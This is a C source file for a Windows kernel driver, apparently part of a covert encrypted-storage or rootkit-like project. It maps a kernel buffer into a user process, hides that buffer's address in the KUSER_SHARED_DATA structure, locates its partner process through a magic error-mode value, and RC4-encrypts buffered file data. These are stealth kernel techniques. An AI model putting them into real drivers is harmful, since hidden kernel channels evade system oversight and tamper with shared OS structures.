#include "main.h"
#include "comm.h"
#include "rc4.h"
#include "rc6.h"
#include "disk.h"
#include "vfs.h"
#include "linked_list.h"

VOID Comm_MapBufferInUserSpace()
{
	pMdl = IoAllocateMdl(&s_SharedBuffer, sizeof(SHARED_BUFFER), FALSE, FALSE, NULL);
	MmBuildMdlForNonPagedPool(pMdl);
	__try
	{
		addrMdl = MmMapLockedPagesSpecifyCache(pMdl, UserMode, MmCached, NULL, FALSE, HighPagePriority);
		if(!addrMdl)
		{
			MmUnlockPages(pMdl);
			IoFreeMdl(pMdl);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER){}
	PsTerminateSystemThread(0);
}

VOID wrap_MDL_DumpStructure()
{
	PSHARED_BUFFER pSharedBuffer;
	LARGE_INTEGER li1;
	ULONG i, j;
	UCHAR rc4key[RC4_KEY_SIZE] = {0};
	RC4_STATE rc4state = {0};

	pSharedBuffer = (PSHARED_BUFFER)addrMdl;
	
	for(j=0; j<RC4_KEY_SIZE; j+=4)
	{
		i = RtlRandomEx(&g_seed);
		RtlCopyMemory(rc4key+j, &i, sizeof(ULONG));
	}
	
	
	Dbg("[+] RC4 key generated\n");
	for(j=0; j<RC4_KEY_SIZE; j++)
		Dbg("%02x", rc4key[j] & 0xff);
		
	RC4_Init(&rc4state, rc4key, 16);	
	Dbg("RC4 Init ok\n");
	RC4_EncryptDecryptBuffer(&rc4state, pSharedBuffer->data, pSharedBuffer->data, pSharedBuffer->raw_data_len);
	Dbg("After encryption : \n");
	for(i=0; i<10; i++)
		Dbg("%02x", pSharedBuffer->data[i]);
	
	Dbg("[+] File has been encrypted\n");
	if(nb_entries < 30)  
	{
		AddContainerToList(pSharedBuffer, rc4key);
		Dbg("[+] AddContainerToList ok !\n");
	}
	
	RC4_Init(&rc4state, rc4key, 16);	
	RC4_EncryptDecryptBuffer(&rc4state, pSharedBuffer->data, pSharedBuffer->data, pSharedBuffer->raw_data_len);
	Dbg("After decryption : \n");
	for(i=0; i<10; i++)
		Dbg("%02x", pSharedBuffer->data[i]);
	
	PsTerminateSystemThread(0);
}

VOID wrap_MDL_ResetUserEvent()
{
	NTSTATUS status;
	LARGE_INTEGER Interval;
	PSHARED_BUFFER pSharedBuffer;
	UNICODE_STRING usFunc;
	PKEVENT pEvent;
	
	pSharedBuffer = (PSHARED_BUFFER)addrMdl;
	Interval.QuadPart = RELATIVE(SECONDS(1));
	
	while(!NT_SUCCESS(status = ObReferenceObjectByHandle(pSharedBuffer->event_user_file_sent, EVENT_ALL_ACCESS, *ExEventObjectType, UserMode, &pEvent, NULL)))
	{
		Dbg("ObReferenceObjectByHandle : %x\n", status);
		KeDelayExecutionThread(0, 0, &Interval);
	}
	KeResetEvent(pEvent);
	ObDereferenceObject(pEvent);
	PsTerminateSystemThread(0);
}

VOID wrap_MDL_ResetEvent()
{
	NTSTATUS status;
	LARGE_INTEGER Interval;
	PSHARED_BUFFER pSharedBuffer;
	UNICODE_STRING usFunc;
	PKEVENT pEvent;
	
	pSharedBuffer = (PSHARED_BUFFER)addrMdl;
	Interval.QuadPart = RELATIVE(SECONDS(1));
	
	while(!NT_SUCCESS(status = ObReferenceObjectByHandle(pSharedBuffer->event_driver_ready_to_recv_file, EVENT_ALL_ACCESS, *ExEventObjectType, UserMode, &pEvent, NULL)))
	{
		Dbg("ObReferenceObjectByHandle : %x\n", status);
		KeDelayExecutionThread(0, 0, &Interval);
	}
	KeResetEvent(pEvent);
	ObDereferenceObject(pEvent);
	PsTerminateSystemThread(0);
}

VOID wrap_MDL_SetFinishEvent()
{
	NTSTATUS status;
	LARGE_INTEGER Interval;
	PSHARED_BUFFER pSharedBuffer;
	UNICODE_STRING usFunc;
	PKEVENT pEvent;
	
	pSharedBuffer = (PSHARED_BUFFER)addrMdl;
	Interval.QuadPart = RELATIVE(SECONDS(1));
	
	while(!NT_SUCCESS(status = ObReferenceObjectByHandle(pSharedBuffer->event_driver_memory_full, EVENT_ALL_ACCESS, *ExEventObjectType, UserMode, &pEvent, NULL)))
	{
		Dbg("ObReferenceObjectByHandle : %x\n", status);
		KeDelayExecutionThread(0, 0, &Interval);
	}
	KeSetEvent(pEvent, 0, FALSE);
	ObDereferenceObject(pEvent);
	PsTerminateSystemThread(0);
}

VOID wrap_MDL_SetEvent()
{
	NTSTATUS status;
	LARGE_INTEGER Interval;
	PSHARED_BUFFER pSharedBuffer;
	UNICODE_STRING usFunc;
	PKEVENT pEvent;
	
	pSharedBuffer = (PSHARED_BUFFER)addrMdl;
	Interval.QuadPart = RELATIVE(SECONDS(1));
	
	while(!NT_SUCCESS(status = ObReferenceObjectByHandle(pSharedBuffer->event_driver_ready_to_recv_file, EVENT_ALL_ACCESS, *ExEventObjectType, UserMode, &pEvent, NULL)))
	{
		Dbg("ObReferenceObjectByHandle : %x\n", status);
		KeDelayExecutionThread(0, 0, &Interval);
	}
	KeSetEvent(pEvent, 0, FALSE);
	ObDereferenceObject(pEvent);
	PsTerminateSystemThread(0);
}

VOID wrap_MDL_WaitFinishEvent()
{
	NTSTATUS status;
	LARGE_INTEGER Interval;
	PSHARED_BUFFER pSharedBuffer;
	UNICODE_STRING usFunc;
	PKEVENT pEvent;
	
	pSharedBuffer = (PSHARED_BUFFER)addrMdl;
	Interval.QuadPart = RELATIVE(SECONDS(1));
	
	while(!NT_SUCCESS(status = ObReferenceObjectByHandle(pSharedBuffer->event_user_all_files_sent, EVENT_ALL_ACCESS, *ExEventObjectType, UserMode, &pEvent, NULL)))
	{
		Dbg("ObReferenceObjectByHandle : %x\n", status);
		KeDelayExecutionThread(0, 0, &Interval);
	}
	Dbg("wait for finish event\n");
	KeWaitForSingleObject(pEvent, 0, KernelMode, FALSE, NULL);
	Dbg("finish event received !\n");
	ObDereferenceObject(pEvent);
	bFinish = TRUE;
	PsTerminateSystemThread(0);	
}

VOID wrap_MDL_WaitEvent()
{
	NTSTATUS status;
	LARGE_INTEGER Interval;
	PSHARED_BUFFER pSharedBuffer;
	UNICODE_STRING usFunc;
	PKEVENT pEvent;
	
	pSharedBuffer = (PSHARED_BUFFER)addrMdl;
	Interval.QuadPart = RELATIVE(SECONDS(1));
	
	while(!NT_SUCCESS(status = ObReferenceObjectByHandle(pSharedBuffer->event_user_file_sent, EVENT_ALL_ACCESS, *ExEventObjectType, UserMode, &pEvent, NULL)))
	{
		Dbg("ObReferenceObjectByHandle : %x\n", status);
		KeDelayExecutionThread(0, 0, &Interval);
	}
	KeWaitForSingleObject(pEvent, 0, KernelMode, FALSE, NULL);
	ObDereferenceObject(pEvent);
	PsTerminateSystemThread(0);	
}

NTSTATUS Comm_AccessMdl(PVOID func)
{
	NTSTATUS status;
	HANDLE hProc;
	CLIENT_ID ClientId = {0};
	OBJECT_ATTRIBUTES objAttr = {0};
	HANDLE hThread;
	ULONG ulThreadStartAddr = 0;
	PVOID object;
	PKUSER_SHARED_DATA pUserSharedData = NULL;
			
	ClientId.UniqueProcess = (HANDLE)g_pid;
	InitializeObjectAttributes(&objAttr, NULL, 0x40, 0, NULL);
	if(!NT_SUCCESS(status = ZwOpenProcess(&hProc, GENERIC_ALL, &objAttr, &ClientId)))
	{
		Dbg("cannot open process : %x\n", status);
		return status;
	}
	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, 0, NULL);
	status = PsCreateSystemThread(&hThread, GENERIC_ALL, &objAttr, hProc, NULL, (PKSTART_ROUTINE)func, NULL);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(ObReferenceObjectByHandle(hThread, GENERIC_ALL, 0, KernelMode, &object, 0)))
		{
			KeWaitForSingleObject(object, 0, 0, 0, NULL);
			if(object)
				ObDereferenceObject(object);
		}
		if(hThread)
			ZwClose(hThread);
		if(hProc)
			ZwClose(hProc);
		status = STATUS_SUCCESS;
	}
	else
		Dbg("cannot create thread : %x\n", status);
	return status;
}

NTSTATUS Comm_InitMDL()
{
	NTSTATUS status;
	HANDLE hProc;
	CLIENT_ID ClientId = {0};
	OBJECT_ATTRIBUTES objAttr = {0};
	HANDLE hThread;
	ULONG ulThreadStartAddr = 0;
	PVOID object;
	LARGE_INTEGER Interval;
	PKUSER_SHARED_DATA pUserSharedData = NULL;
	
	Interval.QuadPart = RELATIVE(SECONDS(1));		
	ClientId.UniqueProcess = (HANDLE)g_pid;
	InitializeObjectAttributes(&objAttr, NULL, 0x40, 0, NULL);
	if(!NT_SUCCESS(status = ZwOpenProcess(&hProc, GENERIC_ALL, &objAttr, &ClientId)))
		return status;
	
	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, 0, NULL);
	status = PsCreateSystemThread(&hThread, GENERIC_ALL, &objAttr, hProc, NULL, (PKSTART_ROUTINE)Comm_MapBufferInUserSpace, NULL);
	if(NT_SUCCESS(status))
	{
		while(addrMdl == 0)
			KeDelayExecutionThread(0, 0, &Interval);
		if(NT_SUCCESS(ObReferenceObjectByHandle(hThread, GENERIC_ALL, 0, KernelMode, &object, 0)))
		{
			KeWaitForSingleObject(object, 0, 0, 0, NULL);
			if(object)
				ObDereferenceObject(object);
		}
		if(hThread)
			ZwClose(hThread);
		if(hProc)
			ZwClose(hProc);
		status = STATUS_SUCCESS;
	}
	
	// modify field from KI_USER_SHARED_DATA to put the MDL @ (:
	pUserSharedData = (PKUSER_SHARED_DATA)KI_USER_SHARED_DATA;
	pUserSharedData->SystemExpirationDate.QuadPart = (LONGLONG)addrMdl;
	
	return status;
}

NTSTATUS Comm_WaitUserlandNotif(THREAD_ARGS* t_args)
{
	NTSTATUS status = STATUS_SUCCESS;
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation;
	UNICODE_STRING usFunc, usFunc2;
	ULONG ulReturnLength;
	PVOID buffer;
	HANDLE hProcess;
	CLIENT_ID ClientId = {0};
	OBJECT_ATTRIBUTES objAttr = {0};
	ULONG ulProcErrorMode = 0;
	LARGE_INTEGER Interval;
	BOOL bProcessFound = FALSE;
	
	RtlInitUnicodeString(&usFunc, L"ZwQuerySystemInformation");
	RtlInitUnicodeString(&usFunc2, L"ZwQueryInformationProcess");
	ZwQuerySystemInformation = MmGetSystemRoutineAddress(&usFunc);
	ZwQueryInformationProcess = MmGetSystemRoutineAddress(&usFunc2);
	Interval.QuadPart = RELATIVE(SECONDS(1));
	
	while(!bProcessFound)
	{
		Dbg("in the loop\n");
		ulReturnLength = 0;
		status = ZwQuerySystemInformation(5, NULL, 0, &ulReturnLength);
		
		buffer = PoolAlloc(ulReturnLength);
		if(!buffer)
			return STATUS_NO_MEMORY;
		
		pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)buffer;
		
		status = ZwQuerySystemInformation(5, pSystemProcessInformation, ulReturnLength, NULL);
		if(!NT_SUCCESS(status))
		{
			PoolFree(buffer);
			return STATUS_UNSUCCESSFUL;
		}

		while(pSystemProcessInformation->NextEntryOffset)
		{
			ClientId.UniqueProcess = pSystemProcessInformation->ProcessId;
			InitializeObjectAttributes(&objAttr, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);
			if(NT_SUCCESS(ZwOpenProcess(&hProcess, 0x1400, &objAttr, &ClientId)))
			{
				ulProcErrorMode = 0;
				ZwQueryInformationProcess(hProcess, 12, &ulProcErrorMode, sizeof(ULONG), &ulReturnLength);
				if(((ulProcErrorMode & 0xFF) >= 0x41) && ((ulProcErrorMode & 0xFF) <= 0x7A))
				{
					Dbg("[+] Process user found : pid : %d, name : %wZ, ulProcErrorMode : %lx\n", pSystemProcessInformation->ProcessId, pSystemProcessInformation->ImageName, ulProcErrorMode);
					t_args->cDiskLetter = ulProcErrorMode & 0xFF;
					t_args->dwPid = (DWORD)pSystemProcessInformation->ProcessId;
					bProcessFound = TRUE;
					break;
				}
				ZwClose(hProcess);
			}
			pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pSystemProcessInformation+pSystemProcessInformation->NextEntryOffset);
		}
		PoolFree(buffer);
		KeDelayExecutionThread(0, 0, &Interval);
	}
	
	PsTerminateSystemThread(0);
	return STATUS_SUCCESS;
}

NTSTATUS Comm_InitUserlandThread(PWCHAR diskpath)
{
	NTSTATUS status;
	HANDLE hThread;
	PVOID object;
	THREAD_ARGS s_targs;
	
	s_targs.dwPid = 0;
	s_targs.cDiskLetter = 0;

	status = PsCreateSystemThread(&hThread, GENERIC_ALL, NULL, NULL, NULL, Comm_WaitUserlandNotif, &s_targs);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(ObReferenceObjectByHandle(hThread, GENERIC_ALL, 0, KernelMode, &object, 0)))
		{
			KeWaitForSingleObject(object, 0, 0, 0, NULL);
			g_pid = s_targs.dwPid;
			if(!NT_SUCCESS(RtlStringCchPrintfW(diskpath, 20, DISKPATH_FORMAT, s_targs.cDiskLetter)))
				return STATUS_INVALID_PARAMETER;
			if(object)
				ObDereferenceObject(object);
		}
		if(hThread)
			ZwClose(hThread);
		status = STATUS_SUCCESS;
	}
	
	return STATUS_SUCCESS;
}